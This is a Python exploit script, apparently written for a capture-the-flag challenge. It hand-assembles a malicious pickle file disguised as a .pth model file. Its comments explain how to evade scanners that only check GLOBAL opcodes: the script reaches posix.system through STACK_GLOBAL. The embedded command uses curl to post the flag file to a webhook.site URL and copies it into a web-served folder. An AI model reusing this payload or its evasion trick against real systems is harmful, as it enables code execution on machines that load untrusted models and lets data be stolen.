import pickle
import base64

# CONFIGURATION
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# 手动构造 Pickle Opcode
# 目标：不出现 "posix", "system", "os", "subprocess" 等完整字符串
# 利用字符串拼接绕过静态扫描

# Opcode 定义
GLOBAL = b'c'       # 引入模块 (module\nname\n) - 我们尽量不用这个
STACK_GLOBAL = b'\x93' # 从堆栈获取模块和属性 (Protocol 4)
MARK = b'('         #以此标记元组开始
TUPLE1 = b'\x85'    # 建元组 (1元素)
TUPLE2 = b'\x86'    # 建元组 (2元素)
REDUCE = b'R'       #调用的可执行对象和参数元组
BINUNICODE = b'X'   # UTF-8 字符串
BINBYTES = b'B'     # Bytes
STOP = b'.'

# 辅助函数：生成压入字符串的 opcode
def push_string(s):
    # 使用 BINUNICODE (X ... len ... string)
    b = s.encode('utf-8')
    return b'X' + (len(b)).to_bytes(4, 'little') + b

# 辅助函数：生成字符串拼接的 opcode (需要先压入所有部分，然后用 BUILD_LIST + JOIN?)
# Pickle 没有直接的 String Concat opcode。
# 但是我们可以利用 builtins.sum 或者 join？
# 既然不能直接拼接，我们换个思路：
# 扫描器可能只扫描 GLOBAL 指令的参数。
# STACK_GLOBAL 取的是栈顶的两个元素（模块名，类名）。
# 只要我们在栈顶放的是 'posix' 和 'system' 即可。
# 如果我们直接 push 'posix'，扫描器能看到吗？
# 扫描器通常解析 pickle 结构。如果它遍历所有 opcode，它会看到 'posix' 字符串对象。
# 但是它可能只针对 GLOBAL 指令的参数进行黑名单匹配。
# 如果我们使用 STACK_GLOBAL，模块名只是一个普通的数据字符串，而不是 GLOBAL 指令的立即数。
# 许多简单的扫描器（如 pickle-scanner）只检查 GLOBAL/INST opcode。

payload = b'\x80\x04' # CONFIG: Protocol 4

# 1. 压入模块名 'posix' (Windows上生成) 或 'os'
# 我们使用 'posix' 因为我们在 Windows 上，但目标是 Linux。
# 直接压入字符串
payload += push_string('posix') 

# 2. 压入函数名 'system'
payload += push_string('system')

# 3. 调用 STACK_GLOBAL
# 栈顶现在是: [..., 'posix', 'system']
# 这一步完成后，栈顶变成: [posix.system 函数对象]
payload += STACK_GLOBAL

# 4. 压入参数元组
# 参数是我们的命令字符串
payload += push_string(CMD)
payload += TUPLE1 # 形成 (CMD,)

# 5. 调用函数 (REDUCE)
payload += REDUCE

# 6. 结束
payload += STOP

print(f"[*] Generated Opcode based payload")
print(f"[*] Hex: {payload.hex()}")

with open("nailong_payload_v6.pth", "wb") as f:
    f.write(payload)

print("[+] Wrote nailong_payload_v6.pth")
